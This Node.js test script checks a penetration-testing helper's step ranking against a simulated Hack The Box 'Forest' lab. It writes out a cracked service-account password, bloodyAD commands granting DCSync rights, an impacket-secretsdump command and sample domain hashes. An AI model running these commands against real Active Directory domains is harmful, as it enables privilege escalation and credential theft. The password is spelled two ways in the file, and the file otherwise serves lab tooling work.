const fs = require('fs');

global.window = global;
global.OBOL = global.OBOL || {};

require('../assets/engine/facts.js');
require('../assets/engine/profile.js');
require('../assets/engine/vfs.js');
require('../assets/engine/command.js');
require('../assets/engine/pack.js');
require('../assets/engine/phases.js');
require('../assets/engine/parsers/common.js');
require('../assets/engine/parsers/shape.js');
require('../assets/engine/parsers/blockers.js');
require('../assets/engine/parsers/creds.js');
require('../assets/engine/parsers/directory.js');
require('../assets/engine/parsers/index.js');
require('../data/packs-bundle.js');
require('../assets/engine/packs.js');
const bh = require('../assets/engine/bloodhound.js');

const target = '10.10.10.161';
const domain = 'htb.local';
const store = new OBOL.facts.FactSet();

function addFact(kind, value, scope) {
  store.add(OBOL.facts.makeFact({
    kind: kind,
    scope: scope || 'host:' + target,
    value: value || {},
    source: 'test'
  }));
}

console.log('=== VERIFYING HTB: FOREST PROGRESSION ===');

// 1. Initial Recon
addFact('port.open', { port: 88, service: 'kerberos-sec' });
addFact('port.open', { port: 389, service: 'ldap' });
addFact('port.open', { port: 445, service: 'microsoft-ds' });
addFact('port.open', { port: 5985, service: 'wsman' });
addFact('host.os', { os: 'windows' });
addFact('ad.domain_known', { name: domain });
addFact('ad.dc_candidate', { host: target, domain: domain });

// 2. AS-REP Roasting yields svc-alfresco:s3rv1ce
addFact('credential.available', { user: 'svc-alfresco', password: 's3rv1ce', domain: domain });
addFact('winrm.reachable', { port: 5985 });
addFact('access.shell', { user: 'svc-alfresco', tool: 'evil-winrm' });

// 3. User Flag locate & capture on svc-alfresco Desktop
const userFlagAction = OBOL.packs.actions().find(a => a.id === 'flag-hunt-windows');
console.log('Checking user flag hunt action:', userFlagAction.id);
const opts = { locus: 'target', params: { target, domain, user: 'svc-alfresco', password: 's3rv1ce' } };
const uIdx = OBOL.command.bestCommandIndex(userFlagAction, store, opts);
console.log('User flag suggested command index:', uIdx);

// Simulate user flag located
addFact('objective.flag_located', { slot: 'user', name: 'user.txt', path: 'C:\\Users\\svc-alfresco\\Desktop\\user.txt' });
addFact('objective.user_flag', { flag: 'e5b7c...userflag', slot: 'user' });

// 4. BloodHound ingestion: svc-alfresco -> Exchange Windows Permissions -> WriteDacl -> Domain
const bhSummary = {
  domain: domain,
  users: 15,
  dcsync_principals: ['DC01$'],
  high_value: ['Domain Admins', 'Domain Controllers']
};
const bhPaths = [
  [
    { from: 'SVC-ALFRESCO@HTB.LOCAL', edge: 'MemberOf', to: 'SERVICE ACCOUNTS@HTB.LOCAL', to_kind: 'Group' },
    { from: 'SERVICE ACCOUNTS@HTB.LOCAL', edge: 'MemberOf', to: 'PRIVILEGED IT ACCOUNTS@HTB.LOCAL', to_kind: 'Group' },
    { from: 'PRIVILEGED IT ACCOUNTS@HTB.LOCAL', edge: 'MemberOf', to: 'ACCOUNT OPERATORS@HTB.LOCAL', to_kind: 'Group' },
    { from: 'ACCOUNT OPERATORS@HTB.LOCAL', edge: 'GenericAll', to: 'EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL', to_kind: 'Group' },
    { from: 'EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL', edge: 'WriteDacl', to: 'HTB.LOCAL', to_kind: 'Domain' }
  ]
];

const bhFacts = bh.toFacts(bhSummary, bhPaths, 'domain:' + domain);
console.log('BloodHound generated facts for Forest:', bhFacts.map(f => f.kind));
bhFacts.forEach(f => store.add(f));

// Check that ad.attack_paths and ad.acl_lead are present, and ad.control_paths is NOT prematurely minted
if (!store.has('ad.attack_paths') || !store.has('ad.acl_lead')) {
  console.error('FAIL: ad.attack_paths or ad.acl_lead missing from BloodHound ingest!');
  process.exit(1);
}
if (store.has('ad.control_paths')) {
  console.error('FAIL: ad.control_paths must NOT be minted before walking the ACL path!');
  process.exit(1);
}
console.log('PASS: BloodHound minted ad.attack_paths + ad.acl_lead without premature ad.control_paths');

// 5. Verify bloodyad-acl is #1 on Next Steps, un-settled, and fills group without @HTB.LOCAL
const bloodyAction = OBOL.packs.actions().find(a => a.id === 'bloodyad-acl');
const dcsyncAction = OBOL.packs.actions().find(a => a.id === 'dcsync');
if (!bloodyAction.eligible(store) || bloodyAction.settled(store)) {
  console.error('FAIL: bloodyad-acl should be eligible and NOT settled after BloodHound upload!');
  process.exit(1);
}
if (dcsyncAction.eligible(store)) {
  console.error('FAIL: dcsync must NOT be eligible before granting replication rights!');
  process.exit(1);
}
const rankedAfterBh = OBOL.pack.rankActions(store, OBOL.packs.actions(), {});
console.log('Top 3 moves after BloodHound:', rankedAfterBh.slice(0, 3).map(a => a.id));
if (!rankedAfterBh[0] || rankedAfterBh[0].id !== 'bloodyad-acl') {
  console.error('FAIL: bloodyad-acl should be Rank #1 after BloodHound upload, got:', rankedAfterBh[0] && rankedAfterBh[0].id);
  process.exit(1);
}
const filledStep1 = OBOL.command.fillAll(bloodyAction, store, { params: { target, domain, user: 'svc-alfresco', password: 's3rvice' } });
if (!filledStep1[1].filled.includes('"EXCHANGE WINDOWS PERMISSIONS"') || filledStep1[1].filled.includes('@HTB.LOCAL')) {
  console.error('FAIL: bloodyad-acl Command 1 did not fill clean group name:', filledStep1[1].filled);
  process.exit(1);
}
console.log('PASS: bloodyad-acl is Rank #1 and fills:', filledStep1[1].filled);

// 6. Simulate Hop 1: adding svc-alfresco to EXCHANGE WINDOWS PERMISSIONS
const parseGroupAdd = OBOL.parsers.parseActionOutput({
  actionId: 'bloodyad-acl',
  command: 'bloodyAD --host "10.10.10.161" -d "htb.local" -u "svc-alfresco" -p \'s3rvice\' add groupMember "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco',
  stdout: '[+] svc-alfresco added to EXCHANGE WINDOWS PERMISSIONS\n',
  scope: 'host:' + target,
  domain: domain
});
parseGroupAdd.facts.forEach(f => store.add(f));
if (!OBOL.pack.commandSettled(bloodyAction.commands[1], store) || OBOL.pack.commandSettled(bloodyAction.commands[3], store)) {
  console.error('FAIL: After Hop 1, add groupMember should be settled and add dcsync should be active!');
  process.exit(1);
}
console.log('PASS: Hop 1 (add groupMember) settled; Hop 2 (add dcsync) is now the active command!');

// 7. Simulate Hop 2: granting DCSync rights to svc-alfresco
const parseDcsyncGrant = OBOL.parsers.parseActionOutput({
  actionId: 'bloodyad-acl',
  command: 'bloodyAD --host "10.10.10.161" -d "htb.local" -u "svc-alfresco" -p \'s3rvice\' add dcsync svc-alfresco',
  stdout: '[+] svc-alfresco is now able to dcsync\n',
  scope: 'host:' + target,
  domain: domain
});
parseDcsyncGrant.facts.forEach(f => store.add(f));
if (!bloodyAction.settled(store) || !dcsyncAction.eligible(store)) {
  console.error('FAIL: After Hop 2 (add dcsync), bloodyad-acl should settle and dcsync should unlock!');
  process.exit(1);
}
const rankedAfterGrant = OBOL.pack.rankActions(store, OBOL.packs.actions(), {});
console.log('Top 3 moves after DCSync grant:', rankedAfterGrant.slice(0, 3).map(a => a.id));
if (!rankedAfterGrant[0] || rankedAfterGrant[0].id !== 'dcsync') {
  console.error('FAIL: dcsync should be Rank #1 after granting DCSync rights, got:', rankedAfterGrant[0] && rankedAfterGrant[0].id);
  process.exit(1);
}
console.log('PASS: dcsync is now Rank #1!');

// 8. DCSync output parsed -> mints administrator hash & credential.admin
const secretsdumpOutput = `
HTB.LOCAL\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c7241450771:::
HTB.LOCAL\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:184a44f56f1766a267e7cf5d506e1dc2:::
`;
const parseDcsync = OBOL.parsers.parseActionOutput({
  actionId: 'dcsync',
  command: "impacket-secretsdump 'htb.local/svc-alfresco:s3rv1ce'@10.10.10.161",
  stdout: secretsdumpOutput,
  scope: 'domain:' + domain
});
console.log('DCSync parsed facts:', parseDcsync.facts.map(f => f.kind + ' -> ' + JSON.stringify(f.value)));
parseDcsync.facts.forEach(f => store.add(f));

// 9. Verify root flag hunt is top-ranked
const rootAction = OBOL.packs.actions().find(a => a.id === 'flag-hunt-root-windows');
const isRootEligible = rootAction.eligible(store);
console.log('Is flag-hunt-root-windows eligible?:', isRootEligible);
if (!isRootEligible) {
  console.error('FAIL: flag-hunt-root-windows should be eligible once Administrator hash is held!');
  process.exit(1);
}
console.log('PASS: flag-hunt-root-windows is eligible and un-gated!');


console.log('\nALL HTB: FOREST FLOW CHECKS PASSED WITH ZERO REGRESSIONS!');
